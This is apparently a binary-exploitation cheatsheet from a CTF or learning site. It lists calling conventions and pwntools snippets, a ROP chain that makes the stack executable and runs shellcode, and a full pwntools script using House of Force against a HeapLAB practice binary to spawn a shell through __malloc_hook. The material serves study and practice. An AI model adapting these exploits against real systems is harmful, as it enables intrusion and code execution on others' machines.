I"C<h1 id="cheatsheet">Cheatsheet</h1>
<h2 id="calling-convention">Calling Convention</h2>

<table>
  <thead>
    <tr>
      <th>Arch</th>
      <th>Registers</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Linux (x64)</td>
      <td><code class="language-plaintext highlighter-rouge">rdi, rsi, rdx, rcx, r8, r9</code></td>
    </tr>
    <tr>
      <td>Windows (x64)</td>
      <td><code class="language-plaintext highlighter-rouge">rcx, rdx, r8, r9</code></td>
    </tr>
  </tbody>
</table>

<h2 id="pwntools">pwntools</h2>

<table>
  <thead>
    <tr>
      <th>Item</th>
      <th>Code</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Shellcode</td>
      <td><code class="language-plaintext highlighter-rouge">shellcode = asm(shellcraft.sh())</code></td>
    </tr>
    <tr>
      <td>Strings</td>
      <td><code class="language-plaintext highlighter-rouge">binsh = libc.search('/bin/sh\x00;).next()</code></td>
    </tr>
    <tr>
      <td>Gadgets</td>
      <td><code class="language-plaintext highlighter-rouge">gadget = exe.search(asm('pop rdi; ret')).next()</code></td>
    </tr>
    <tr>
      <td>Address of Section</td>
      <td><code class="language-plaintext highlighter-rouge">data = exe.get_section_by_name('.data').header.sh_addr</code></td>
    </tr>
  </tbody>
</table>

<h2 id="ret2syscall">ret2syscall</h2>
<ul>
  <li><code class="language-plaintext highlighter-rouge">execve(/bin/sh)</code>
    <ul>
      <li>64-bit: <code class="language-plaintext highlighter-rouge">rax = 59, rdi = /bin/sh, rsi = 0, rdx = 0</code></li>
      <li>32-bit: <code class="language-plaintext highlighter-rouge">eax = 11, ebx = /bin/sh, ecx = 0, edx = 0</code></li>
    </ul>
  </li>
  <li><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">Syscall Table</a></li>
</ul>

<h1 id="techniques">Techniques</h1>

<h2 id="rop">ROP</h2>

<h3 id="ret2stack-making-the-stack-executable">ret2stack: Making the stack executable</h3>
<ol>
  <li>Set value of <code class="language-plaintext highlighter-rouge">__stack_prot</code> to 7</li>
  <li>Call <code class="language-plaintext highlighter-rouge">_dl_make_stack_executable(__libc_stack_end, __stack_prot)</code></li>
  <li>Jump to shellcode</li>
</ol>

<p><strong>Example</strong></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>

<span class="n">_dl_make_stack_executable</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_dl_make_stack_executable'</span><span class="p">]</span>
<span class="n">__stack_prot</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__stack_prot'</span><span class="p">]</span>
<span class="n">__libc_stack_end</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_stack_end'</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">120</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000410ca3</span><span class="p">)</span> <span class="c1"># pop rsi ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">__stack_prot</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004163f4</span><span class="p">)</span> <span class="c1"># pop rax ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000047ff91</span><span class="p">)</span> <span class="c1"># mov qword ptr [rsi], rax ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400696</span><span class="p">)</span> <span class="c1"># pop rdi ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">__libc_stack_end</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">_dl_make_stack_executable</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000451974</span><span class="p">)</span> <span class="c1"># push rsp ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
</code></pre></div></div>

<h3 id="ret2csu-lack-of-gadgets-in-x64">ret2csu: Lack of gadgets in x64</h3>
<p><a href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html?m=1">Link</a></p>

<h2 id="heap">Heap</h2>

<h3 id="house-of-force">House of Force</h3>

<p>Exploiting Top Chunk header to gain nearly-arbitrary write primitive.</p>

<p><strong>Requirements</strong></p>
<ul>
  <li>Control of top chunk size, usually through heap overflow</li>
  <li>Full control of size of allocated chunks</li>
</ul>

<p><strong>Arbitrary Write Primitive</strong></p>
<ul>
  <li>Overwrite size of top chunk to <code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code></li>
  <li>Allocate chunk with size of <code class="language-plaintext highlighter-rouge">offset</code>, using <code class="language-plaintext highlighter-rouge">malloc()</code>
    <ul>
      <li>If <code class="language-plaintext highlighter-rouge">target &lt; top_chunk</code>: <code class="language-plaintext highlighter-rouge">offset = top_chunk - target + allocated_chunks_size</code>, and offset is negative</li>
      <li>If <code class="language-plaintext highlighter-rouge">target &gt; top_chunk</code>: <code class="language-plaintext highlighter-rouge">offset = target - top_chunk - allocated_chunks_size</code></li>
    </ul>
  </li>
  <li>Allocate new chunk, this chunk will be created at <code class="language-plaintext highlighter-rouge">target</code></li>
</ul>

<p><strong>Gaining RCE using ret2libc</strong>
<em>This requires libc version to be known</em></p>
<ul>
  <li>Overwrite <code class="language-plaintext highlighter-rouge">__malloc_hook</code> using write primitive with <code class="language-plaintext highlighter-rouge">system()</code></li>
  <li>Call <code class="language-plaintext highlighter-rouge">malloc(/bin/sh)</code></li>
</ul>

<p><strong>Example: HeapLAB House of Force</strong></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./house_of_force"</span><span class="p">,</span>
    <span class="s">"libc"</span> <span class="p">:</span> <span class="s">"./libc-2.28.so"</span><span class="p">,</span>
    <span class="s">"ld"</span> <span class="p">:</span> <span class="s">"./ld.so.2"</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'size:'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'data:'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="c1"># Get addresses
</span>    <span class="n">ru</span><span class="p">(</span><span class="s">'puts() @ '</span><span class="p">)</span>
    <span class="n">puts</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s">'heap @ '</span><span class="p">)</span>
    <span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    
    <span class="c1"># Calculate libc_base, etc...
</span>    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
    <span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
    <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
    <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">).</span><span class="nb">next</span><span class="p">()</span>

    <span class="n">lg</span><span class="p">(</span><span class="s">'heap_addr: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>
    <span class="n">lg</span><span class="p">(</span><span class="s">'malloc_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
    <span class="n">lg</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
    <span class="n">lg</span><span class="p">(</span><span class="s">'binsh: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>
    
    <span class="c1"># House of Force: Overwrite top_chunk size
</span>    <span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>
    
    <span class="s">"""
    # Overwrite target with "OVERWRIT"
    target = elf.symbols['target']
    top_chunk = heap_addr + 0x20
    offset = top_chunk - target + 32
    ru('&gt;')
    malloc(-offset, p64(0xdeadbeef))
    malloc(16, 'OVERWRIT')
    sla('&gt;', '2')
    """</span>

    <span class="c1"># Pop shell with ret2libc by overwriting __malloc_hook with system() 
</span>    <span class="n">top_chunk</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x20</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="n">top_chunk</span> <span class="o">-</span> <span class="mi">32</span>
    <span class="n">ru</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">)</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="s">"Y"</span><span class="p">)</span> 
    <span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">'size:'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>

    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">])</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">config</span><span class="p">[</span><span class="s">"ld"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">]],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]})</span>
    <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li><a href="/House-of-Force/">House of Force</a>: Exploiting Top Chunk header to gain nearly-arbitrary write primitive</li>
  <li><a href="/Fastbin-Dupe/">Fastbin Dupe</a>: Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist.</li>
  <li><a href="/Unsafe-Unlink/">Unsafe Unlink</a>: Exploiting free on a corrupted chunk to get arbitrary write.</li>
</ul>
:ET